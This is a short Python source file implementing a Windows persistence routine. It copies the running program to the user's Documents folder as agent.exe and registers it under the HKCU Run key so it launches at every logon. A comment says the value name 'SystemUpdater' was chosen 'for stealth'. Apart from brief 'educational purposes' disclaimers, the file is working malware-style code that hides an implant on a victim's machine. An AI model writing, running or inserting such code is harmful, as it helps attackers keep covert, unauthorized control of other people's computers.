import os
import sys
import subprocess
import shutil
import logging
from pathlib import Path

# WARNING: This is for educational purposes only
# Using persistence mechanisms without authorization is illegal

logger = logging.getLogger(__name__)


def setup_persistence():
    """
    Set up persistence mechanism (Windows Registry).
    WARNING: Use only in authorized environments.
    """
    try:
        # Only run on Windows
        if sys.platform != 'win32':
            logger.warning("Persistence only supported on Windows")
            return False
        
        import winreg
        
        # Get user profile directory
        user_profile = os.environ.get('USERPROFILE')
        if not user_profile:
            logger.error("Could not determine user profile directory")
            return False
        
        # Define destination path
        destination_dir = Path(user_profile) / 'Documents'
        destination_file = destination_dir / 'agent.exe'
        current_file = Path(sys.argv[0]).resolve()
        
        # Skip if already in destination
        if current_file == destination_file:
            logger.info("Already running from persistence location")
            return True
        
        # Copy file to destination
        if not destination_file.exists():
            try:
                destination_dir.mkdir(parents=True, exist_ok=True)
                shutil.copy2(current_file, destination_file)
                logger.info(f"Copied to: {destination_file}")
            except Exception as e:
                logger.error(f"Failed to copy file: {e}")
                return False
        
        # Add to Windows Registry startup
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            winreg.SetValueEx(
                key,
                'SystemUpdater',  # Changed from RegUpdater for stealth
                0,
                winreg.REG_SZ,
                str(destination_file)
            )
            
            winreg.CloseKey(key)
            logger.info("Added to startup registry")
            return True
            
        except Exception as e:
            logger.error(f"Failed to add to registry: {e}")
            return False
            
    except Exception as e:
        logger.error(f"Persistence setup failed: {e}")
        return False


if __name__ == "__main__":
    # Only set up persistence if explicitly called
    setup_persistence()
